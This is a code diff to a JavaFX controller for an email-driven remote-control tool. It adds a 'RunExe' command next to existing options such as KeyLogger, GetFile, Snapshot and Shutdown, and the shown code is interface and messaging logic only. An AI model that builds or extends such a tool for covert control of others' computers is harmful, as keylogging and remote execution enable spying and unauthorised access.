@@ -55,7 +55,7 @@ public class sendMailController {
 
     public void initialize() {
         List<String> list = List.of("Snapshot", "KeyLogger", "GetFile",
-                "ListDirectory", "ListProcess", "StopProcess", "OpenProcess", "Shutdown");
+                "ListDirectory", "ListProcess", "StopProcess", "OpenProcess", "Shutdown", "RunExe");
         comboBox.setItems(FXCollections.observableList(list));
         comboBox.getSelectionModel().selectFirst();
         addField.setEditable(false);
@@ -96,6 +96,12 @@ public class sendMailController {
                             addField.setDisable(true);
                             addField.setEditable(false);
                             labelAddField.setText("Coming Soon");
+                            sendBut.setDisable(false);
+                        }
+                        case "RunExe" ->{
+                            addField.setDisable(false);
+                            addField.setEditable(true);
+                            labelAddField.setText("File's path");
                             sendBut.setDisable(false);
                         }
                         default -> sendBut.setDisable(true);
@@ -315,6 +321,40 @@ public class sendMailController {
                         logText(emoji3 + e.getMessage(), "red");
                         e.printStackTrace();
                     } finally {
+                        Platform.runLater(() -> {
+                            sendBut.setDisable(false);
+                            logText("- - - - - - - - - - - - - - - - - - - - - - - - - - - - - ", coloruse);
+                            comboBox.setDisable(false);
+                        });
+                    }
+                });
+                thread.start();
+            }
+            case "RunExe" ->{
+                int id = random.nextInt(1000, 9999);
+                int tmp = id % 1000 % 100 % 10;
+                while (tmp > 3) tmp -= 3;
+                String coloruse = colorList.get(tmp);
+                sendBut.setDisable(true);
+                Thread thread = new Thread(() -> {
+                    try {
+                        System.out.println(Thread.currentThread().getName());
+                        SendMail.getInstance().sendMail("req / " + id + " / " + "runexe");
+                        logText(emoji1 + "ID: " + id + " Send Mail Successfully! Wait for response!", coloruse);
+                        String a = CheckMail.getInstance().listen(id, 40);
+                        if (a != null) {
+                            if (a.equals("0"))
+                                logText(emoji1 + "Exitcode: " + a, coloruse);
+                            else
+                                logText(emoji3+ "Exitcode: " + a, coloruse);
+                        } else {
+                            logText(emoji3 + "ID: " + id + " Error happens", "red");
+                        }
+
+                    } catch (Exception e) {
+                        logText(emoji3 + e.getMessage(), "red");
+                        e.printStackTrace();
+                    }finally {
                         Platform.runLater(() -> {
                             sendBut.setDisable(false);
                             logText("- - - - - - - - - - - - - - - - - - - - - - - - - - - - - ", coloruse);
